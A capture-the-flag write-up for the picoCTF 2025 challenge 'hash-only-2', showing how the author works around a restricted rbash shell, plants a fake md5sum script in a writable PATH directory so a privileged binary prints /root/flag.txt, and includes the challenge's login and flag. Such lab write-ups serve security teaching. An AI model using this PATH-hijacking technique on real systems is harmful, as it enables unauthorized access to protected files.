# PicoCTF 2025

## hash-only-2

> Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!  
> Author: Junias Bonou  
> [`hash-only-2`](hash-only-2)

**Tags:** binary_exploitation

---

## ðŸ§¾ Overview

Much like `hash-only-1`, this challenge provides a binary named `flaghasher` that can read the contents of `/root/flag.txt`, but only prints its MD5 hash. This time, however, the environment is more restricted â€” weâ€™re placed inside a `rbash` (restricted bash) shell that blocks common actions like redirection (`>`), slashes in command arguments, and text editors. The challenge is to work around those restrictions and recover the actual flag.

---

## âœ… Solution

I connected to the server using the provided credentials:

```bash
ssh ctf-player@rescued-float.picoctf.net -p 60710
# password: 6dd28e9b
```

Once inside, I ran the binary:

```bash
flaghasher
```

It printed:

```
Computing the MD5 hash of /root/flag.txt....

4268c8737000b13184189a06b5054d72  /root/flag.txt
```

This confirmed that the binary was calling `md5sum` on the flag file. The trick â€” just like in `hash-only-1` â€” would be to replace `md5sum` with a custom script that reveals the file contents before passing it along to the real `md5sum`.

To do this, I first checked which directories in my `$PATH` were writable:

```bash
for dir in $(echo $PATH | tr ':' '\n'); do [ -w "$dir" ] && echo "$dir is writable"; done
```

The output showed:

```
/usr/local/bin is writable
```

Perfect. Since `/usr/local/bin` comes early in the path, I could drop a fake `md5sum` script there to override the real one.

Because redirection (`>`) was disabled in `rbash`, I used `tee` to write the script manually:

```bash
tee /usr/local/bin/md5sum
```

Once `tee` started waiting for input, I pasted the following:

```bash
#!/bin/bash
cat "$@"
/bin/md5sum "$@"
```

Then I pressed `Ctrl+D` to save and exit.

Next, I made the script executable:

```bash
chmod +x /usr/local/bin/md5sum
```

Then I simply ran the binary again:

```bash
flaghasher
```

This time, it printed:

```
picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_1a74f5fd}
4268c8737000b13184189a06b5054d72  /root/flag.txt
```

So even with a restricted shell, I was able to hijack the systemâ€™s behavior and retrieve the flag by using a writable directory in `$PATH` and the `tee` command.

---

## Flag

```
picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_1a74f5fd}
```
